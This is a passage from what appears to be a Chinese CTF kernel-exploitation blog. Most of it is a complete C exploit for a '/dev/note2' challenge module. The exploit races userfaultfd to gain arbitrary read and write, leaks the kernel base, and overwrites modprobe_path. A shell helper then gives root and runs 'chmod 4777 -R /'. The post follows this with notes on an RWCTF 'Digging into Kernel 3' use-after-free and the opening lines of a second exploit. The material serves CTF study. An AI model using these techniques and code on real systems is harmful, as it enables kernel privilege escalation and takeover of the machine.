class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;signal.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/syscall.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/ioctl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/sem.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;semaphore.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;poll.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sched.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> ofs_modprobe_path 0x1654b20</span><br><span class="hljs-type">int</span> note2_fd=<span class="hljs-number">-1</span>;<br><span class="hljs-comment">//void * kernel_base = (void *)0xffffffff81000000;</span><br><span class="hljs-type">int</span> cnt;<br><span class="hljs-type">char</span> *buf;<br><span class="hljs-type">pthread_t</span> <span class="hljs-type">edit_t</span>,edit_t2;<br><span class="hljs-type">size_t</span> key;<br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">node</span></span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">uint64_t</span> key;<br><span class="hljs-type">uint64_t</span> size;<br><span class="hljs-type">uint64_t</span> addr;<br>&#125;;<br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> </span><br><span class="hljs-class">&#123;</span><br><span class="hljs-type">uint64_t</span> idx;<br><span class="hljs-type">uint64_t</span> size;<br><span class="hljs-type">uint64_t</span> addr;<br>&#125;Note;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">add</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> size,<span class="hljs-type">uint64_t</span> addr)</span>&#123;<br>    Note note=&#123;<br>.size=size,<br>.addr=addr,<br>    &#125;;<br>    ioctl(note2_fd,<span class="hljs-number">0xFFFFFF00</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">edit</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> idx,<span class="hljs-type">uint64_t</span> addr)</span>&#123;<br>    Note note=&#123;<br>        .idx=idx,<br>.addr=addr,<br>    &#125;;<br>    ioctl(note2_fd,<span class="hljs-number">0xFFFFFF01</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">show</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> idx,<span class="hljs-type">uint64_t</span> addr)</span>&#123;<br>    Note note=&#123;<br>        .idx=idx,<br>.addr=addr,<br>    &#125;;<br>    ioctl(note2_fd,<span class="hljs-number">0xFFFFFF02</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">del</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> idx)</span>&#123;<br>    Note note=&#123;<br>        .idx=idx,<br>    &#125;;<br>    ioctl(note2_fd,<span class="hljs-number">0xFFFFFF03</span>,&amp;note);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">errExit</span><span class="hljs-params">(<span class="hljs-type">char</span> * msg)</span><br>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[31m\033[1m[x] Error at: \033[0m%s\n&quot;</span>, msg);<br>    <span class="hljs-built_in">exit</span>(EXIT_FAILURE);<br>&#125;<br><br><span class="hljs-type">pthread_t</span> monitor_thread;<br><span class="hljs-type">void</span> <span class="hljs-title function_">registerUserFaultFd</span><span class="hljs-params">(<span class="hljs-type">void</span> * addr, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> len, <span class="hljs-type">void</span> (*handler)(<span class="hljs-type">void</span>*))</span><br>&#123;<br>    <span class="hljs-type">long</span> uffd;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_api</span> <span class="hljs-title">uffdio_api</span>;</span><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_register</span> <span class="hljs-title">uffdio_register</span>;</span><br>    <span class="hljs-type">int</span> s;<br><br>    <span class="hljs-comment">/* Create and enable userfaultfd object */</span><br>    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);<br>    <span class="hljs-keyword">if</span> (uffd == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;userfaultfd&quot;</span>);<br><br>    uffdio_api.api = UFFD_API;<br>    uffdio_api.features = <span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_API&quot;</span>);<br><br>    uffdio_register.range.start = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) addr;<br>    uffdio_register.range.len = len;<br>    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;<br>    <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);<br><br>    s = pthread_create(&amp;monitor_thread, <span class="hljs-literal">NULL</span>, (<span class="hljs-type">void</span> * (*)(<span class="hljs-type">void</span> *))handler, (<span class="hljs-type">void</span> *) uffd);<br>    <span class="hljs-keyword">if</span> (s != <span class="hljs-number">0</span>)<br>        errExit(<span class="hljs-string">&quot;pthread_create&quot;</span>);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> page_size;<br><span class="hljs-type">char</span>*page;<br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">fault_handler_thread</span><span class="hljs-params">(<span class="hljs-type">void</span> *arg)</span><br>&#123;<br>    page_size=sysconf(_SC_PAGESIZE);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffd_msg</span> <span class="hljs-title">msg</span>;</span><br>    <span class="hljs-type">long</span> uffd;<br><br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">uffdio_copy</span> <span class="hljs-title">uffdio_copy</span>;</span><br>    <span class="hljs-type">ssize_t</span> nread;<br><br>    uffd = (<span class="hljs-type">long</span>) arg;<br><br>    <span class="hljs-keyword">for</span> (;;) <br>    &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> <span class="hljs-title">pollfd</span>;</span><br>        <span class="hljs-type">int</span> nready;<br>        pollfd.fd = uffd;<br>        pollfd.events = POLLIN;<br>        nready = poll(&amp;pollfd, <span class="hljs-number">1</span>, <span class="hljs-number">-1</span>);<br><br>        <span class="hljs-keyword">if</span> (nready == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;poll&quot;</span>);<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1mUserfaultfd %d Start!\e[0m\n&quot;</span>,cnt);<br>        <span class="hljs-keyword">switch</span> (cnt)<br>        &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">0</span>:<br>            del(<span class="hljs-number">0</span>);<br>            add(<span class="hljs-number">0x50</span>,(<span class="hljs-type">uint64_t</span>)<span class="hljs-literal">NULL</span>);<span class="hljs-comment">//idx=0</span><br>            add(<span class="hljs-number">0x50</span>,(<span class="hljs-type">uint64_t</span>)<span class="hljs-literal">NULL</span>);<span class="hljs-comment">//idx=1</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-number">1</span>:<br>            del(<span class="hljs-number">2</span>);<br>            add(<span class="hljs-number">0x50</span>,(<span class="hljs-type">uint64_t</span>)<span class="hljs-literal">NULL</span>);<span class="hljs-comment">//idx=2</span><br>            add(<span class="hljs-number">0x50</span>,(<span class="hljs-type">uint64_t</span>)<span class="hljs-literal">NULL</span>);<span class="hljs-comment">//idx=3</span><br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">default</span>:<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br><br>        nread = read(uffd, &amp;msg, <span class="hljs-keyword">sizeof</span>(msg));<br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">0</span>)<br>            errExit(<span class="hljs-string">&quot;EOF on userfaultfd!\n&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (nread == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;read&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (msg.event != UFFD_EVENT_PAGEFAULT)<br>            errExit(<span class="hljs-string">&quot;Unexpected event on userfaultfd\n&quot;</span>);<br><br>        <br>        uffdio_copy.src = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) page;<br>        uffdio_copy.dst = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) msg.arg.pagefault.address &amp;<br>                                              ~(page_size - <span class="hljs-number">1</span>);<br>        uffdio_copy.len = page_size;<br>        uffdio_copy.mode = <span class="hljs-number">0</span>;<br>        uffdio_copy.copy = <span class="hljs-number">0</span>;<br>        <span class="hljs-keyword">if</span> (ioctl(uffd, UFFDIO_COPY, &amp;uffdio_copy) == <span class="hljs-number">-1</span>)<br>            errExit(<span class="hljs-string">&quot;ioctl-UFFDIO_COPY&quot;</span>);<br><br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[31m\e[1mUserfaultfd %d done!\e[0m\n&quot;</span>,cnt);<br>        cnt++;<br><br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">evil_edit</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span>&#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[34m\e[1m[+] fault_page = 0x%016lx\e[0m\n&quot;</span>,(<span class="hljs-type">long</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>)(buf + <span class="hljs-number">0x1000</span>*cnt));<br>    edit((<span class="hljs-type">uint64_t</span>)args, (<span class="hljs-type">uint64_t</span>)(buf + <span class="hljs-number">0x1000</span>*cnt));<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">Hexdump</span><span class="hljs-params">(<span class="hljs-type">char</span> *buf, <span class="hljs-type">long</span> size)</span><br>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;(size/<span class="hljs-number">8</span>);i++)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[96m\e[1m[+%02x]:\t0x%016llx\e[0m\n&quot;</span>, i*<span class="hljs-number">8</span>, *(<span class="hljs-type">size_t</span> *)(buf + i*<span class="hljs-number">8</span>));<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">hijack_modprobe</span><span class="hljs-params">()</span><br>&#123;<br><span class="hljs-comment">// 0x752f706d742f  u/pmt/</span><br>system(<span class="hljs-string">&quot;echo -ne &#x27;#!/bin/sh\nsetsid cttyhack setuidgid 0 /bin/sh\nchmod 4777 -R /\n&#x27; &gt; /tmp/u&quot;</span>);<br>system(<span class="hljs-string">&quot;chmod +x /tmp/u&quot;</span>);<br>system(<span class="hljs-string">&quot;echo -ne &#x27;\xff\xff\xff\xff&#x27; &gt; /tmp/qyq&quot;</span>);<br>system(<span class="hljs-string">&quot;chmod +x /tmp/qyq&quot;</span>);<br>system(<span class="hljs-string">&quot;/tmp/qyq&quot;</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">cpu_set_t</span> pwn_cpu;<br>CPU_ZERO(&amp;pwn_cpu);<br>    CPU_SET(<span class="hljs-number">0</span>, &amp;pwn_cpu);<br>    setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br><br>    note2_fd=open(<span class="hljs-string">&quot;/dev/note2&quot;</span>,O_RDWR);<br>    <span class="hljs-keyword">if</span>(note2_fd==<span class="hljs-number">-1</span>)<br>        errExit(<span class="hljs-string">&quot;/dev/note!&quot;</span>);<br>    <br>    buf = (<span class="hljs-type">char</span> *)mmap(<span class="hljs-literal">NULL</span>, <span class="hljs-number">0x2000</span>, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    registerUserFaultFd(buf,<span class="hljs-number">0x2000</span>,fault_handler_thread);<br><br>    <span class="hljs-comment">//---------------AAR----------------------------</span><br>    page=<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<br>    add(<span class="hljs-number">0x18</span>,(<span class="hljs-type">uint64_t</span>)<span class="hljs-literal">NULL</span>);<span class="hljs-comment">//idx=0</span><br>    <span class="hljs-type">size_t</span> *fake_note=(<span class="hljs-type">size_t</span>*)page;<br>    fake_note[<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;<br>    fake_note[<span class="hljs-number">1</span>]=<span class="hljs-number">0x30</span>;<br>    fake_note[<span class="hljs-number">2</span>]=<span class="hljs-number">0xfffffe0000000000</span>;<br>    pthread_create(&amp;<span class="hljs-type">edit_t</span>, <span class="hljs-literal">NULL</span>, evil_edit,(<span class="hljs-type">void</span>*)<span class="hljs-number">0</span>);<br>    usleep(<span class="hljs-number">1000000</span>);<span class="hljs-comment">//must to sleep for a while</span><br>    show(<span class="hljs-number">1</span>,page);<br>    Hexdump(page,<span class="hljs-number">0x20</span>);<br>    key=*(<span class="hljs-type">u_int64_t</span>*)(page+<span class="hljs-number">8</span>)^<span class="hljs-number">0xffffffff</span>;<br>    *(<span class="hljs-type">u_int64_t</span>*)(page)^=key;<br>    *(<span class="hljs-type">u_int64_t</span>*)(page+<span class="hljs-number">8</span>)^=key;<br>    *(<span class="hljs-type">u_int64_t</span>*)(page+<span class="hljs-number">16</span>)^=key;<br>    *(<span class="hljs-type">u_int64_t</span>*)(page+<span class="hljs-number">24</span>)^=key;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] rand_key = 0x%016lx\e[0m\n&quot;</span>, key);<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;decryption xor:\n&quot;</span>);<br>    Hexdump(page,<span class="hljs-number">0x20</span>);<br>    <span class="hljs-type">size_t</span> kbase=*(<span class="hljs-type">u_int64_t</span>*)(page+<span class="hljs-number">4</span>)- <span class="hljs-number">0xa08e00</span>;<br>    <span class="hljs-comment">/*</span><br><span class="hljs-comment">        /home/note # cat /proc/kallsyms|grep &quot;T startup_64$&quot;</span><br><span class="hljs-comment">        ffffffffa4c00000 T startup_64</span><br><span class="hljs-comment">        /home/note #</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">        (page+4)-ffffffffa4c00000=0xa08e00</span><br><span class="hljs-comment">    */</span> <br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] kernel_base = 0x%016lx\e[0m\n&quot;</span>, kbase);<br>    <span class="hljs-type">size_t</span> modprobe_path=kbase+ofs_modprobe_path;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] modprobe_path = 0x%016lx\e[0m\n&quot;</span>, modprobe_path);<br>    <span class="hljs-comment">//------------------AAW------------------------------</span><br>    fake_note[<span class="hljs-number">0</span>]=<span class="hljs-number">0</span>;<br>    fake_note[<span class="hljs-number">1</span>]=<span class="hljs-number">0x30</span>;<br>    fake_note[<span class="hljs-number">2</span>]=modprobe_path;<br>    add(<span class="hljs-number">0x18</span>,<span class="hljs-literal">NULL</span>);<span class="hljs-comment">//idx=2</span><br>    pthread_create(&amp;edit_t2, <span class="hljs-literal">NULL</span>, evil_edit,(<span class="hljs-type">void</span>*)<span class="hljs-number">2</span>);<br>    usleep(<span class="hljs-number">1000000</span>);<span class="hljs-comment">//must to sleep for a while</span><br><br>    show(<span class="hljs-number">3</span>,page);<br>    Hexdump(page,<span class="hljs-number">0x8</span>);<br>    key = (*(<span class="hljs-type">size_t</span> *)(page)) ^ (<span class="hljs-number">0x6f6d2f6e6962732f</span>);<span class="hljs-comment">// /sbin/mo</span><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\e[32m\e[1m[+] rand_key2 = 0x%016lx\e[0m\n&quot;</span>, key);<br>    <span class="hljs-built_in">strcpy</span>(page,<span class="hljs-string">&quot;/tmp/u&quot;</span>);<br>    *(<span class="hljs-type">size_t</span> *)(page) ^= key;<br>    edit(<span class="hljs-number">3</span>, page);<br>    hijack_modprobe();<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>成功提权至root</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/1-1672215105471.png" alt="1"></p><h2 id="08-modprobe-path">08. modprobe_path</h2><h3 id="2023RWCTF-Digging-into-Kernel-3">2023RWCTF Digging into Kernel 3</h3><p>Real World CTF体验赛的kernel pwn，复现下</p><h4 id="0x1分析-3">0x1分析</h4><p>有个uaf,问题在于如何去泄露内核地址</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/1-1684595090620.png" alt="1"></p><h4 id="0x2msg-queue-struct-shm-file-data">0x2msg_queue&amp;struct shm_file_data</h4><p>详细的看这个，写的挺好</p><p><a href="https://arttnba3.cn/2021/11/29/PWN-0X02-LINUX-KERNEL-PWN-PART-II/#0x07-system-V-%E6%B6%88%E6%81%AF%E9%98%9F%E5%88%97%EF%BC%9A%E5%86%85%E6%A0%B8%E4%B8%AD%E7%9A%84%22%E8%8F%9C%E5%8D%95%E5%A0%86%22">【PWN.0x02】Linux Kernel Pwn II：常用结构体集合 - arttnba3’s blog</a></p><h4 id="0x3思路-2">0x3思路</h4><p>用msg泄露kernel的.text地址</p><blockquote><p>首先制作一个0x20大小的uaf，接着创建一个0x1018大小的struct msg</p><p>此时0x20部分的struct msg会被放入uaf中，将其free，分配一个struct shm_file_data</p><p>此时在输出struct msg就可以成功泄露kernel地址</p><p>特别要注意，由于内核关闭了CONFIG_CHECKPOINT_RESTORE，MSG_COPY无法使用</p><p>并且由于SElinux的开启，struct msg的security指针不能被破坏</p><p>因此进行uaf的结构体的前8个字节必须要为0，目前似乎仅有struct shm_file_data能满足条件</p></blockquote><p>默认是没开<a href="https://rtfingc.github.io/slub-freelist-hardened">Slub Freelist Hardened </a>,用doublefree任意写modprobe_path</p><p>关于为什么是0x1018我画了张图，hhh</p><p><img src="/2023/02/05/kernel%E5%85%A5%E9%97%A8/3.jpg" alt="3"></p><h4 id="0x4Exp-2">0x4Exp</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/types.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;linux/userfaultfd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;pthread.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;errno.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span 